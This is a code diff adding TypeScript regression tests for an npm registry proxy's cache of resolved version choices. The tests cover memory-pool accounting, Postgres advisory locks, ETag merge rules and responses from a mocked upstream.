+        return new Response("{bad json", { headers: { etag: `"changed"` } });
+      },
+    });
+
+    const layers = Layer.provideMerge(Upstream.layer(npm.url.href, 60_000, null), Layer.mergeAll(Store.postgres("postgres://unused.invalid/none"), noBlobs, RequestMemory.layer(new MemoryPool())));
+
+    try {
+      const got = await Effect.runPromise(
+        Effect.gen(function* () {
+          const up = yield* Upstream;
+          const listing = yield* up.listingIfChanged("bad", yield* RequestMemory, `"old"`);
+          const version = yield* up.versionOf("bad", "1.0.0");
+
+          return { listing: listing.kind, version: version.kind };
+        }).pipe(Effect.provide(layers), Effect.scoped),
+      );
+
+      expect(got.listing).toBe("unknown");
+      expect(counts.conditional).toBe(1);
+      // on 67d8658: the version document was asked for at once
+      expect(got.version).toBe("unknown");
+      expect(counts.version).toBe(0);
+    } finally {
+      await npm.stop(true);
+    }
+  });
+
+  test("finding 4: with another writer holding the lock, a resolve answers at once, and its rows are written after it or skipped", () =>
+    withRig(async ({ url, npm, sql }) => {
+      const locker = new Client({ connectionString: url });
+      await locker.connect();
+      await locker.query("BEGIN");
+      await locker.query("SELECT pg_advisory_xact_lock($1)", [KEPT_CHOICES_INSERT_LOCK]);
+      const within = <A>(p: Promise<A>, ms: number) => Promise.race([p, new Promise<"late">((r) => setTimeout(() => r("late"), ms))]);
+
+      try {
+        // no writer (no Worker request): the write is tried before the answer, and skipped rather than waited for
+        const inline = await within(resolve({ url, npm: npm.url, name: "app" }), 5_000);
+
+        // on 67d8658: still waiting on the lock
+        expect(inline === "late" ? "late" : inline.status).toBe(200);
+        expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 0 }]);
+        // with a writer (a Worker request): the answer does not wait, and the rows are written after it
+        const later: Effect.Effect<void, never, Store | RequestMemory>[] = [];
+        const writer = Layer.succeed(ChoicesWriter, ChoicesWriter.of({ later: (write) => Effect.sync(() => void later.push(write)) }));
+        const base = Layer.mergeAll(Store.postgres(url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, { maxMs: 0, pollMs: 1 }), Layer.succeed(RegistryConfig, settings(npm.url)), RequestMemory.layer(new MemoryPool()), writer);
+        const layers = Layer.provideMerge(Upstream.layer(npm.url, 60_000, null), base);
+        const answered = await within(Effect.runPromise(Effect.map(resolveResponse(new URL("http://registry.test/-/apm/v1/resolve?name=app&range=latest")), (r) => r.status).pipe(Effect.provide(layers), Effect.scoped)), 5_000);
+
+        expect(answered).toBe(200);
+        expect(later.length).toBeGreaterThan(0);
+        expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 0 }]);
+        await locker.query("ROLLBACK");
+
+        for (const write of later) await Effect.runPromise(write.pipe(Effect.provide(Layer.mergeAll(Store.postgres(url), RequestMemory.layer(new MemoryPool()))), Effect.scoped));
+        expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 3 }]);
+      } finally {
+        await locker.query("ROLLBACK").catch(() => undefined);
+        await locker.end();
+      }
+    }));
+});
+
+// Re-check of 51fc813: a plan is one string, charged once, and the merge with older choices is the database's. Each of
+// these failed on 51fc813.
+describe("kept choices: re-check of 51fc813", () => {
+  /** A version record with a `script`-character install script, as a whole read hands it to a plan. */
+  const record = (version: string, script = 0): VersionRecord => ({
+    package: "app",
+    version,
+    manifest: script === 0 ? {} : { scripts: { install: "x".repeat(script) } },
+    shasum: "1".repeat(40),
+    integrity: "",
+    size: 0,
+    tarball_key: "",
+    published_at: NOW,
+    seq: 0,
+    published_by: "u",
+    deprecated: null,
+    status: "active",
+    status_reason: null,
+    status_at: null,
+    status_by: null,
+    score: null,
+  });
+
+  test("P1: writing a plan cannot take back the plan it is writing: it stays charged until its row is put, or is skipped", async () => {
+    const db = await freshDatabase();
+    const c = new Client({ connectionString: db.url });
+
+    try {
+      await c.connect();
+
+      for (const tight of [false, true]) {
+        await c.query(`DELETE FROM upstream_choices`);
+        const pool = new MemoryPool(400_000);
+        const side = KeptSide.open(pool);
+        const plan = keptPlan({ document: "http://npm.invalid/app", etag: `"same"`, distTags: { latest: "1.0.0" }, versions: new Map([["v", [record("1.0.0", 20_000)]]]), reserve: side, at: NOW });
+
+        if (plan === null) throw new Error("no plan");
+        const handle = side.holdPlan(plan);
+        const writer = pool.request(400_000);
+        const other = pool.request(400_000);
+        const driver = driverWriteBytes(plan);
+        // tight: what the driver allocates fits only if the pool takes back the plan being written
+        expect(other.take(pool.limit - plan.weight - (tight ? Math.floor(driver / 2) : driver))).toBe(true);
+        const atPut: { charged: number; needed: number }[] = [];
+
+        await Effect.runPromise(
+          Effect.gen(function* () {
+            const store = yield* Store;
+
+            const watched: StoreApi = {
+              ...store,
+              writeChoices: (input, write) => store.writeChoices(input, (put) => write((row) => Effect.sync(() => void atPut.push({ charged: pool.charged, needed: other.taken + plan.weight + driver })).pipe(Effect.andThen(put(row))))),
+            };
+
+            yield* keepPlans({ store: watched, plans: [handle], at: NOW, lease: writer });
+          }).pipe(Effect.provide(Store.postgres(db.url)), Effect.scoped),
+        );
+        const rows = z.array(z.object({ n: z.number() })).parse((await c.query(`SELECT count(*)::int AS n FROM upstream_choices`)).rows)[0]?.n;
+
+        // on 51fc813: written while the pool counted 175,000 of the 216,022 the plan and the others needed
+        for (const seen of atPut) expect(seen.charged).toBeGreaterThanOrEqual(seen.needed);
+        expect(rows).toBe(tight ? 0 : 1);
+        expect(atPut.length).toBe(tight ? 0 : 1);
+        // let go either way, string and charge
+        expect(handle.claim()).toBeNull();
+        expect(pool.charged).toBe(other.taken);
+        writer.release();
+        other.release();
+        side.close();
+      }
+    } finally {
+      await c.end();
+      await db.drop();
+    }
+  });
+
+  test("P1: a plan with no versions and large dist-tags is charged its full text, also while it waits for the writer", () =>
+    withRig(async ({ url, npm, sql }) => {
+      const tags = Object.fromEntries(Array.from({ length: 500 }, (_, i) => [`t${i}${"a".repeat(96)}`, "1.0.0"]));
+      const tagChars = Object.keys(tags).reduce((n, k) => n + k.length, 0);
+      // directly
+      const pool = new MemoryPool(1_000_000);
+      const side = KeptSide.open(pool);
+      const plan = keptPlan({ document: "http://npm.invalid/empty", etag: `"empty"`, distTags: tags, versions: new Map([["root 0 unmatched", []]]), reserve: side, at: NOW });
+
+      if (plan === null) throw new Error("no plan");
+      const handle = side.holdPlan(plan);
+
+      // on 51fc813: weight 0 for 49,890 characters of tags
+      expect(plan.weight).toBeGreaterThanOrEqual(utf8Bytes(plan.text));
+      expect(plan.weight).toBeGreaterThan(tagChars);
+      expect(pool.charged).toBe(plan.weight);
+      handle.done();
+      side.close();
+      expect(pool.charged).toBe(0);
+      // through a resolve whose root range matches nothing: the plan waits for the writer, charged
+      npm.docs.set("app", [doc("app", "1.0.0")]);
+      const later: Effect.Effect<void, never, Store | RequestMemory>[] = [];
+      const writer = Layer.succeed(ChoicesWriter, ChoicesWriter.of({ later: (write) => Effect.sync(() => void later.push(write)) }));
+      const isolate = new MemoryPool();
+
+      const tagged = Bun.serve({
+        port: 0,
+        hostname: "127.0.0.1",
+        fetch: () => {
+          const dist = { tarball: "https://npm.invalid/app.tgz", shasum: "1".repeat(40), integrity: integrityOf("app@1.0.0") };
+
+          return Response.json({ name: "app", "dist-tags": { ...tags, latest: "1.0.0" }, versions: { "1.0.0": { ...doc("app", "1.0.0"), dist } }, time: { "1.0.0": new Date(NOW - 10 * DAY).toISOString() } }, { headers: { etag: `"tagged"` } });
+        },
+      });
+
+      try {
+        const base = Layer.mergeAll(Store.postgres(url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, { maxMs: 0, pollMs: 1 }), Layer.succeed(RegistryConfig, settings(tagged.url.href)), RequestMemory.layer(isolate), writer);
+        const layers = Layer.provideMerge(Upstream.layer(tagged.url.href, 60_000, null), base);
+        const status = await Effect.runPromise(Effect.map(resolveResponse(new URL("http://registry.test/-/apm/v1/resolve?name=app&range=99.0.0")), (r) => r.status).pipe(Effect.provide(layers), Effect.scoped));
+
+        expect(status).toBe(422);
+        expect(later.length).toBe(1);
+        const waiting = isolate.charged;
+
+        for (const write of later) await Effect.runPromise(write.pipe(Effect.provide(Layer.mergeAll(Store.postgres(url), RequestMemory.layer(isolate))), Effect.scoped));
+        // what the waiting plan was charged is given back once it is written: its whole text, the tags included
+        expect(waiting - isolate.charged).toBeGreaterThan(tagChars);
+        expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 1 }]);
+      } finally {
+        await tagged.stop(true);
+      }
+    }));
+
+  test("the database merges a write into the row kept for the same ETag: past their hour dropped, at most 16 choices, at most 64 KiB, another ETag replaces", () =>
+    withRig(async ({ url, sql }) => {
+      const HOUR = 60 * MINUTE;
+
+      const run = (rows: { document: string; etag: string; text: string }[], at: number) =>
+        Effect.runPromise(Effect.flatMap(Store, (s) => s.keepChoices({ rows, at, capacity: 100, maxBytes: KEPT_CHOICES_MAX_TEXT, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })).pipe(Effect.provide(Store.postgres(url)), Effect.scoped));
+
+      const rec = (version: string, pad = 0) => ({ package: "app", version, manifest: pad === 0 ? {} : { scripts: { install: "x".repeat(pad) } }, shasum: "", integrity: "", size: 0, tarball_key: "", published_at: 0, seq: 0, published_by: "u", deprecated: null, status: "active", status_reason: null, status_at: null, status_by: null });
+      const row = (lists: Record<string, { at: number; versions: string[] }>, records: Record<string, ReturnType<typeof rec>>) => JSON.stringify({ distTags: { latest: "1.0.0" }, lists, records });
+      const kept = async (document: string) => z.array(z.object({ etag: z.string(), lists: z.array(z.string()), records: z.array(z.string()) })).parse((await sql(`SELECT etag, ARRAY(SELECT jsonb_object_keys(kept->'lists') ORDER BY 1) AS lists, ARRAY(SELECT jsonb_object_keys(kept->'records') ORDER BY 1) AS records FROM upstream_choices WHERE document = $1`, [document])))[0];
+
+      // the hour: an expired choice and its record go, a recent one stays beside the new one
+      await run([{ document: "hour", etag: `"e"`, text: row({ old: { at: NOW - 2 * HOUR, versions: ["0.1.0"] }, recent: { at: NOW - 10 * MINUTE, versions: ["0.2.0"] } }, { "0.1.0": rec("0.1.0"), "0.2.0": rec("0.2.0") }) }], NOW - 10 * MINUTE);
+      await run([{ document: "hour", etag: `"e"`, text: row({ new: { at: NOW, versions: ["0.3.0"] } }, { "0.3.0": rec("0.3.0") }) }], NOW);
+      // on 51fc813: the write replaced the row, so only "new" was kept
+      expect(await kept("hour")).toEqual({ etag: `"e"`, lists: ["new", "recent"], records: ["0.2.0", "0.3.0"] });
+      // the cap: 16 older choices and 2 new ones keep the 2 new and the 14 newest older
+      const sixteen = Object.fromEntries(Array.from({ length: 16 }, (_, i) => [`c${String(i).padStart(2, "0")}`, { at: NOW - (16 - i) * MINUTE, versions: [`1.${i}.0`] }]));
+      await run([{ document: "cap", etag: `"e"`, text: row(sixteen, Object.fromEntries(Array.from({ length: 16 }, (_, i) => [`1.${i}.0`, rec(`1.${i}.0`)]))) }], NOW - MINUTE);
+      await run([{ document: "cap", etag: `"e"`, text: row({ n1: { at: NOW, versions: ["2.0.0"] }, n2: { at: NOW, versions: ["2.1.0"] } }, { "2.0.0": rec("2.0.0"), "2.1.0": rec("2.1.0") }) }], NOW);
+      const capped = await kept("cap");
+
+      expect(capped?.lists.length).toBe(16);
+      expect(capped?.lists).toEqual(["c02", "c03", "c04", "c05", "c06", "c07", "c08", "c09", "c10", "c11", "c12", "c13", "c14", "c15", "n1", "n2"]);
+      expect(capped?.records.length).toBe(16);
+      // the bytes: a merge past 64 KiB keeps only the new choices
+      await run([{ document: "bytes", etag: `"e"`, text: row({ big: { at: NOW - MINUTE, versions: ["3.0.0"] } }, { "3.0.0": rec("3.0.0", 40_000) }) }], NOW - MINUTE);
+      await run([{ document: "bytes", etag: `"e"`, text: row({ also: { at: NOW, versions: ["3.1.0"] } }, { "3.1.0": rec("3.1.0", 30_000) }) }], NOW);
+      expect(await kept("bytes")).toEqual({ etag: `"e"`, lists: ["also"], records: ["3.1.0"] });
+      expect(z.array(z.object({ n: z.number() })).parse((await sql(`SELECT octet_length(kept::text)::int AS n FROM upstream_choices WHERE document = 'bytes'`)))[0]?.n ?? 0).toBeLessThanOrEqual(KEPT_CHOICES_MAX_TEXT);
+      // another ETag: the row is replaced, nothing of the old kept
+      await run([{ document: "hour", etag: `"f"`, text: row({ other: { at: NOW, versions: ["0.4.0"] } }, { "0.4.0": rec("0.4.0") }) }], NOW);
+      expect(await kept("hour")).toEqual({ etag: `"f"`, lists: ["other"], records: ["0.4.0"] });
+    }));
+
+  test("a conditional read whose 200 is JSON but not a packument marks the package, so the next small read does not ask npm", async () => {
+    const counts = { conditional: 0, version: 0 };
+
+    const npm = Bun.serve({
+      port: 0,
+      hostname: "127.0.0.1",
+      fetch: (req) => {
+        if (new URL(req.url).pathname.endsWith("/1.0.0")) {
+          counts.version++;
+
+          return Response.json({ dist: { tarball: "https://npm.invalid/a.tgz", shasum: "1".repeat(40) } });
+        }
+
+        if (req.headers.has("if-none-match")) counts.conditional++;
+
+        return Response.json({ name: 17, versions: {} }, { headers: { etag: `"changed"` } });
+      },
+    });
+
+    const layers = Layer.provideMerge(Upstream.layer(npm.url.href, 60_000, null), Layer.mergeAll(Store.postgres("postgres://unused.invalid/none"), noBlobs, RequestMemory.layer(new MemoryPool())));
+
+    try {
+      const got = await Effect.runPromise(
+        Effect.gen(function* () {
+          const up = yield* Upstream;
+          const listing = yield* up.listingIfChanged("schema", yield* RequestMemory, `"old"`);
+          const version = yield* up.versionOf("schema", "1.0.0");
+
+          return { listing: listing.kind, version: version.kind };
+        }).pipe(Effect.provide(layers), Effect.scoped),
+      );
+
+      expect(got.listing).toBe("unknown");
+      expect(counts.conditional).toBe(1);
+      // on 51fc813: the version document was asked for at once
+      expect(got.version).toBe("unknown");
+      expect(counts.version).toBe(0);
+    } finally {
+      await npm.stop(true);
+    }
+  });
+});
+
+// Review of acdb8eb, findings 2 and 3 (finding 1 is kept-choices-driver.workerd.test.ts): each failed on acdb8eb.
+describe("kept choices: review of acdb8eb", () => {
+  test("finding 2: a plan's head is not built before its reservation: a pool with no room builds nothing", () => {
+    const pool = new MemoryPool(1);
+    const side = KeptSide.open(pool);
+    const versions = Array.from({ length: 21 }, (_, i): VersionRecord => ({ package: "app", version: `1.${i}.0`, manifest: {}, shasum: "", integrity: "", size: 0, tarball_key: "", published_at: NOW, seq: i, published_by: "u", deprecated: null, status: "active", status_reason: null, status_at: null, status_by: null, score: null }));
+    const fromEntries = spyOn(Object, "fromEntries");
+
+    try {
+      const plan = keptPlan({ document: "http://npm.invalid/app", etag: `"e"`, distTags: { latest: "1.20.0" }, versions: new Map([["root 0 latest", versions]]), reserve: side, at: NOW });
+
+      expect(plan).toBeNull();
+      // on acdb8eb: the lists were built (Object.fromEntries) with the pool charged 0, before the reservation failed
+      expect(fromEntries).not.toHaveBeenCalled();
+      expect(pool.charged).toBe(0);
+    } finally {
+      fromEntries.mockRestore();
+      side.close();
+    }
+  });
+
+  test("finding 3: the database merges only under a strong ETag: an equal weak or empty one replaces the row", () =>
+    withRig(async ({ url, sql }) => {
+      const run = (rows: { document: string; etag: string; text: string }[]) =>
+        Effect.runPromise(Effect.flatMap(Store, (s) => s.keepChoices({ rows, at: NOW, capacity: 100, maxBytes: KEPT_CHOICES_MAX_TEXT, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })).pipe(Effect.provide(Store.postgres(url)), Effect.scoped));
+
+      const row = (key: string) => JSON.stringify({ distTags: {}, lists: { [key]: { at: NOW, versions: [] } }, records: {} });
+      const lists = async (document: string) => z.array(z.object({ lists: z.array(z.string()) })).parse(await sql(`SELECT ARRAY(SELECT jsonb_object_keys(kept->'lists') ORDER BY 1) AS lists FROM upstream_choices WHERE document = $1`, [document]))[0]?.lists;
+
+      for (const [document, etag] of [
+        ["weak", `W/"e"`],
+        ["empty", ""],
+        ["strong", `"e"`],
+      ] as const) {
+        await run([{ document, etag, text: row("a") }]);
+        await run([{ document, etag, text: row("b") }]);
+      }
+
+      // on acdb8eb: ["a", "b"] for the weak and empty ETags too
+      expect(await lists("weak")).toEqual(["b"]);
+      expect(await lists("empty")).toEqual(["b"]);
+      expect(await lists("strong")).toEqual(["a", "b"]);
+    }));
+});
